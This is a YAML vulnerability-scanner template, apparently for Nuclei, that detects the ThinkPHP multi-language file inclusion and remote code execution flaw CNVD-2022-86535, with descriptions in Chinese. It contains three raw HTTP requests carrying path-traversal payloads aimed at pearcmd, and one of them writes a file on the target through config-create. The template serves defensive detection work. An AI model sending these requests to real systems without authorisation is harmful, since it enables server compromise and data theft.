id: CNVD-2022-86535

info:
  name: ThinkPHP 多语言功能文件包含及远程代码执行漏洞（CNVD-2022-86535）
  author: arliya,ritikchaddha
  severity: high
  description: |
    ThinkPHP 多语言功能对 `lang` 与 `think-lang` 输入处理不当时，可形成文件包含并结合 `pearcmd` 触发远程代码执行。模板通过 Cookie、请求头和参数多种路径探测，并匹配 `pearcmd` 生成配置文件的成功特征。
  impact: |
    - 攻击者可借助文件包含链执行任意 PHP 相关操作，最终控制 Web 应用。
    - 成功利用后可能写入后门、读取配置文件、窃取数据库凭据并扩展到服务器权限。
  remediation: |
    - 升级 ThinkPHP 到修复版本，关闭或修复多语言参数中的任意文件包含路径。
    - 禁止从用户输入直接解析语言包路径，并限制 `pearcmd` 等敏感工具在生产环境可用性。
    - 排查 Web 目录新增文件、异常日志和可疑 PHP 进程，轮换应用密钥和数据库凭据。
  reference:
    - https://cn-sec.com/archives/1465289.html
    - https://blog.csdn.net/qq_60614981/article/details/128724640
    - https://www.cnvd.org.cn/flaw/show/CNVD-2022-86535
  metadata:
    verified: true
    max-request: 3
  tags: cnvd,cnvd2022,thinkphp,rce,vuln

http:
  - raw:
      - |
        GET /?lang=../../../../../usr/local/php/pearcmd HTTP/1.1
        Host: {{Hostname}}
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        think-lang: ../../../../../usr/local/php/pearcmd
      - |
        GET /?+config-create+/&lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&/safedog()+{{rand_base(10)}}.log HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: or
    matchers:
      - type: word
        part: set_cookie
        words:
          - "think_lang=..%2F..%2F..%2F..%2F"

      - type: word
        part: body_3
        words:
          - "CONFIGURATION"
          - "Successfully created"
        condition: and
